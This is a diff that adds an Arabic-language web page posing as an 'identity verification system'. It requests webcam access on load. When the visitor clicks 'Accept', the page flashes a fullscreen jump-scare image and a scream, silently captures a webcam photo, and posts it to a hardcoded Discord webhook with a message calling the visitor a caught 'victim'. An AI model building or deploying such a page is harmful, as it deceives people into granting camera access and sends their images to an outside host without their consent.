@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق من الهوية</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        #video-container {
+            position: relative;
+            width: 320px;
+            height: 240px;
+            border: 2px solid #0f0;
+            background: #111;
+            margin-bottom: 20px;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: grayscale(1);
+        }
+        .btn {
+            padding: 15px 30px;
+            background: transparent;
+            border: 2px solid #0f0;
+            color: #0f0;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+        /* واجهة الرعب */
+        #scare-ui {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #scare-ui img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2 id="status">جاري الاتصال بالنظام...</h2>
+    
+    <div id="video-container">
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+
+    <button class="btn" onclick="executeProtocol()">تفعيل الدخول (Accept)</button>
+
+    <div id="scare-ui">
+        <img src="https://files.catbox.moe/6v0n8k.jpg" alt="Scary">
+        <audio id="scream-audio" src="https://www.soundjay.com/human/sounds/person-screaming-01.mp3"></audio>
+    </div>
+
+    <canvas id="photo-canvas"></canvas>
+
+    <script>
+        // ضع رابط الويب هوك الخاص بك هنا
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1467269387647193300/OqrAQZ_ldXNS_tHmyFAGVfhDEHUo2neENW6BCvuHyA1pxDT9ebu7_3FDguea3ZA1khbp';
+
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('photo-canvas');
+
+        // طلب الكاميرا عند التحميل
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                document.getElementById('status').innerText = "تم التحقق: النظام جاهز";
+            } catch (err) {
+                document.getElementById('status').innerText = "خطأ: الكاميرا مطلوبة للدخول";
+                console.error("Camera Error:", err);
+            }
+        }
+
+        setupCamera();
+
+        async function executeProtocol() {
+            // 1. إظهار الرعب فوراً وتشغيل الصوت
+            const scareUI = document.getElementById('scare-ui');
+            const audio = document.getElementById('scream-audio');
+            
+            scareUI.style.display = 'flex';
+            audio.play().catch(e => console.log("Audio block: ", e));
+
+            // تفعيل ملء الشاشة لزيادة الرعب
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+
+            // 2. التقاط الصورة
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // 3. إرسال الصورة للديسكورد
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+                
+                const formData = new FormData();
+                formData.append('file', blob, 'capture.png');
+                formData.append('content', '🚨 **تم اصطياد ضحية!** إليك صورته أثناء الفزع:');
+
+                try {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("Discord Error:", error);
+                }
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
